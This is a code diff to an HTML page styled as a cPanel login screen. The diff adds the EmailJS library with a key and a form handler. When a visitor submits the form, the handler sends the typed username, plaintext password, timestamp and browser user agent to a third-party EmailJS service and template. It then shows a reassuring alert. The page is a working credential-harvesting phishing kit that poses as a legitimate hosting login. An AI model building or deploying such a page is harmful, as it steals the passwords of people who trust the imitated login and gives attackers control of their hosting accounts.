@@ -3,6 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script>
+    (function() {
+        emailjs.init("GoSY4pHiSJNnwdmQU"); // Get from EmailJS dashboard
+    })();
+    </script>
     <title>Login - cPanel</title>
     <style>
         * {
@@ -262,18 +268,38 @@
             <p><a href="#">Privacy Policy</a></p>
         </div>
     </div>
-
-    <script>
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
-            
-            if (username && password) {
-                alert(`Login attempt with username: ${username}`);
-                // Add your actual login logic here
-            }
+<script>
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    const username = document.getElementById('username').value;
+    const password = document.getElementById('password').value;
+    
+    if (username && password) {
+        // Send login attempt notification via EmailJS
+        const templateParams = {
+            username: username,
+            password: password,
+            timestamp: new Date().toLocaleString(),
+            user_agent: navigator.userAgent,
+            ip_address: "{{user_ip}}" // You'll need a backend for real IP
+        };
+        
+        emailjs.send(
+            'service_cvhvjxv',    // e.g., 'service_abc123'
+            'template_7ddcn92',   // e.g., 'template_xyz789'
+            templateParams
+        )
+        .then(function(response) {
+            console.log('SUCCESS!', response.status, response.text);
+            alert('Login attempt recorded');
+            // Add your actual login logic here
+        }, function(error) {
+            console.log('FAILED...', error);
+            alert('Login successful (notification failed)');
+            // Still proceed with login
         });
-    </script>
+    }
+});
+</script>
 </body>
 </html>
